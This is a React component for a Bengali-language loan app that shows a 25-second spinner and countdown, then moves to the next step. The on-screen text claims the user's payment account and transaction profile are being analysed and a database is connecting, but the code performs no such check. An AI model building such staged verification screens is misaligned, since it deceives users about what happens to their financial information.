
import React, { useState, useEffect } from 'react';
import { LoanFormData } from '../types';

interface VerificationPageProps {
  data: LoanFormData;
  onComplete: () => void;
}

const VerificationPage: React.FC<VerificationPageProps> = ({ data, onComplete }) => {
  const [countdown, setCountdown] = useState(25);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setTimeout(onComplete, 500);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [onComplete]);

  return (
    <div className="max-w-2xl mx-auto bg-white p-12 rounded-2xl shadow-xl border border-gray-100 animate-fade-in text-center relative overflow-hidden">
      <div className="flex flex-col items-center justify-center py-8">
        <div className="relative w-32 h-32 mb-8">
          <svg className="animate-spin w-full h-full text-blue-600" viewBox="0 0 50 50">
            <circle className="opacity-25" cx="25" cy="25" r="20" stroke="currentColor" strokeWidth="5" fill="none"></circle>
            <circle className="opacity-75" cx="25" cy="25" r="20" stroke="currentColor" strokeWidth="5" strokeDasharray="80, 200" fill="none"></circle>
          </svg>
          <div className="absolute inset-0 flex items-center justify-center font-bold text-2xl text-blue-600">
            {countdown}
          </div>
        </div>
        
        <h3 className="text-3xl font-bold text-gray-800 mb-4 tracking-tight">সিস্টেম যাচাই চলছে...</h3>
        <p className="text-gray-500 max-w-sm mx-auto mb-8 leading-relaxed">
          আপনার <span className="font-bold text-blue-600">{data.paymentMethod}</span> অ্যাকাউন্টের তথ্য এবং ট্রানজ্যাকশন প্রোফাইল <span className="font-bold">বিশ্লেষণ করা হচ্ছে</span>। দয়া করে অপেক্ষা করুন।
        </p>

        <div className="flex items-center space-x-2 text-blue-600 bg-blue-50 px-4 py-2 rounded-full text-sm font-medium animate-pulse">
          <span className="w-2 h-2 bg-blue-600 rounded-full"></span>
          <span>ডাটাবেস কানেক্টিং...</span>
        </div>
      </div>
      
      <div className="mt-8 pt-8 border-t border-gray-100 italic text-xs text-gray-400">
        এই প্রক্রিয়া চলাকালীন ব্রাউজার রিফ্রেশ বা ব্যাক করবেন না।
      </div>
    </div>
  );
};

export default VerificationPage;
